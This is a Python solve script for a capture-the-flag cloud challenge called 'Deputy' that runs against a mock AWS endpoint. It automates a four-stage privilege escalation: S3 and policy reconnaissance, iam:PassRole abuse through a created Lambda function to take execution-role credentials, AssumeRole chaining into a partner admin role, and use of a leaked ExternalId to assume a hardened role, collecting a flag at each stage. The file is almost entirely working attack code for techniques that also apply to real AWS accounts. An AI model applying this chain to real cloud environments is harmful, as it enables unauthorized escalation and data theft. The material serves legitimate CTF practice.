#!/usr/bin/env python
"""Deputy (H7TEX cloud) -- four-stage AWS privilege-escalation walk.

The instance is a mock AWS endpoint (Werkzeug). It never verifies SigV4: it reads
the access key id from the Authorization header and session tokens from
X-Amz-Security-Token, then applies the IAM policy attached to that identity. So a
hand-rolled client works and no boto3 is needed. Every AWS API is dispatched from
"/" by Action (STS + IAM); S3 is path-style GET /<bucket>[/<key>]; Lambda is the
REST API under /2015-03-31/functions.

Chain:
  analyst (given keys)
    1 recon       s3:GetObject on deputy-analyst-scratch          -> flag 1
    2 passrole    iam:PassRole ci-runner-role + lambda:CreateFunction,
                  then invoke: the function runs AS the runner     -> flag 2
    3 admin       runner may sts:AssumeRole partner-admin-role     -> flag 3
    4 externalid  admin reads partner-config.json, which carries the
                  ExternalId the hardened partner-secure-role needs -> flag 4

usage: python solve_deputy.py
"""
import datetime
import re
import sys
import urllib.parse

import requests

import importlib.util
spec = importlib.util.spec_from_file_location("awsclient", "analysis/awsclient.py")
aws = importlib.util.module_from_spec(spec)
spec.loader.exec_module(aws)

BASE = aws.BASE
DAY = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%d")


def hdr(key, svc, token=None):
    h = {"Authorization": "AWS4-HMAC-SHA256 Credential=" + key + "/" + DAY +
         "/us-east-1/" + svc + "/aws4_request, SignedHeaders=host, Signature=x"}
    if token:
        h["X-Amz-Security-Token"] = token
    return h


def api(action, key, svc="iam", token=None, params=None):
    d = {"Action": action}
    if aws.VER.get(svc):
        d["Version"] = aws.VER[svc]
    d.update(params or {})
    r = requests.post(BASE + "/", data=d, headers=hdr(key, svc, token), timeout=30)
    return r.status_code, r.text


def s3get(key, path, token=None):
    r = requests.get(BASE + path, headers=hdr(key, "s3", token), timeout=30)
    return r.status_code, r.text


def grab(text):
    m = re.search(r"H7CTF\{[^{}]*\}", text)
    return m.group() if m else None


def who(key, token=None):
    st, tx = api("GetCallerIdentity", key, "sts", token)
    return re.search(r"<Arn>(.*?)</Arn>", tx).group(1)


def main():
    flags = {}
    ak = aws.AK

    # ---- stage 1: recon -------------------------------------------------
    print("== analyst:", who(ak))
    st, tx = s3get(ak, "/")
    buckets = re.findall(r"<Name>(.*?)</Name>", tx)
    print("[*] ListAllMyBuckets ->", buckets)
    st, tx = api("GetUserPolicy", ak, params={"UserName": "analyst",
                                              "PolicyName": "analyst-permissions"})
    print("[*] own inline policy grants:", sorted(set(re.findall(r'"(?:iam|s3|lambda|sts):[^"]*"',
                                                                 urllib.parse.unquote(tx)))))
    for b in buckets:
        st, tx = s3get(ak, "/" + b)
        if st == 200:
            for k in re.findall(r"<Key>(.*?)</Key>", tx):
                s2, o = s3get(ak, "/%s/%s" % (b, k))
                f = grab(o)
                print("[*] s3://%s/%s -> %d %s" % (b, k, s2, o.splitlines()[0][:60] if o else ""))
                if f:
                    flags["recon"] = f
                    print("[+] STAGE 1 recon:", f)
            if flags.get("recon"):
                break

    # ---- stage 2: PassRole -> Lambda execution role --------------------
    ROLE = "arn:aws:iam::111111111111:role/ci-runner-role"
    fn = "deputy-relay"
    r = requests.post(BASE + "/2015-03-31/functions", headers=hdr(ak, "lambda"), timeout=30,
                      json={"FunctionName": fn, "Runtime": "python3.11", "Role": ROLE,
                            "Handler": "lambda_function.lambda_handler",
                            "Code": {"ZipFile": "UEsDBAoAAAAAAAB"}})
    print("\n[*] lambda:CreateFunction(Role=ci-runner-role) -> %d" % r.status_code)
    r = requests.post(BASE + "/2015-03-31/functions/%s/invocations" % fn,
                      headers=hdr(ak, "lambda"), data="{}", timeout=30)
    j = r.json()
    rk, rs, rt = j["AWS_ACCESS_KEY_ID"], j["AWS_SECRET_ACCESS_KEY"], j["AWS_SESSION_TOKEN"]
    print("[*] invoked, execution role creds:", rk, "->", who(rk, rt))
    st, tx = s3get(rk, "/deputy-runner-logs", rt)
    for k in re.findall(r"<Key>(.*?)</Key>", tx):
        s2, o = s3get(rk, "/deputy-runner-logs/" + k, rt)
        f = grab(o)
        print("[*] s3://deputy-runner-logs/%s -> %d" % (k, s2))
        if f:
            flags["passrole"] = f
            print("[+] STAGE 2 passrole:", f)

    # ---- stage 3: runner -> partner-admin-role --------------------------
    st, tx = api("AssumeRole", rk, "sts", rt,
                 {"RoleArn": "arn:aws:iam::999999999999:role/partner-admin-role",
                  "RoleSessionName": "deputy-step"})
    ad = re.search(r"<AccessKeyId>(.*?)</AccessKeyId>", tx).group(1)
    ads = re.search(r"<SecretAccessKey>(.*?)</SecretAccessKey>", tx).group(1)
    adt = re.search(r"<SessionToken>(.*?)</SessionToken>", tx).group(1)
    print("\n[*] AssumeRole partner-admin-role -> %s" % who(ad, adt))
    st, tx = s3get(ad, "/deputy-flag-vault", adt)
    keys = re.findall(r"<Key>(.*?)</Key>", tx)
    print("[*] deputy-flag-vault keys:", keys)
    external_id = None
    for k in keys:
        s2, o = s3get(ad, "/deputy-flag-vault/" + k, adt)
        f = grab(o)
        if f:
            flags["admin"] = f
            print("[+] STAGE 3 admin:", f)
        e = re.search(r'"external_id"\s*:\s*"([^"]+)"', o)
        if e:
            external_id = e.group(1)
            print("[*] partner-config.json leaks external_id = %s" % external_id)
            print("    secure role =", re.search(r'"secure_role"\s*:\s*"([^"]+)"', o).group(1))

    # ---- stage 4: ExternalId on the hardened role -----------------------
    SEC = "arn:aws:iam::999999999999:role/partner-secure-role"
    st, tx = api("AssumeRole", ad, "sts", adt, {"RoleArn": SEC, "RoleSessionName": "crown-step"})
    print("\n[*] AssumeRole partner-secure-role WITHOUT ExternalId -> %d %s" % (st, grab(tx) or re.search(r"<Message>(.*?)</Message>", tx).group(1)))
    if not external_id:
        sys.exit("[-] no ExternalId recovered from partner-config.json")
    st, tx = api("AssumeRole", ad, "sts", adt, {"RoleArn": SEC, "RoleSessionName": "crown-step",
                                                "ExternalId": external_id})
    ck = re.search(r"<AccessKeyId>(.*?)</AccessKeyId>", tx)
    if not ck:
        sys.exit("[-] stage 4 assume failed: " + tx[:300])
    ckt = re.search(r"<SessionToken>(.*?)</SessionToken>", tx).group(1)
    print("[*] with ExternalId -> %s" % who(ck.group(1), ckt))
    st, tx = s3get(ck.group(1), "/deputy-crown-vault", ckt)
    for k in re.findall(r"<Key>(.*?)</Key>", tx):
        s2, o = s3get(ck.group(1), "/deputy-crown-vault/" + k, ckt)
        f = grab(o)
        print("[*] s3://deputy-crown-vault/%s -> %d %s" % (k, s2, o.strip()[:70]))
        if f:
            flags["externalid"] = f
            print("[+] STAGE 4 externalid:", f)

    print("\n==== summary ====")
    for name in ("recon", "passrole", "admin", "externalid"):
        print("%-11s %s" % (name, flags.get(name, "MISSING")))
    with open("flags.txt", "w") as fh:
        for name in ("recon", "passrole", "admin", "externalid"):
            fh.write("%s %s\n" % (name, flags.get(name, "")))
    return 0 if len(flags) == 4 else 1


if __name__ == "__main__":
    sys.exit(main())
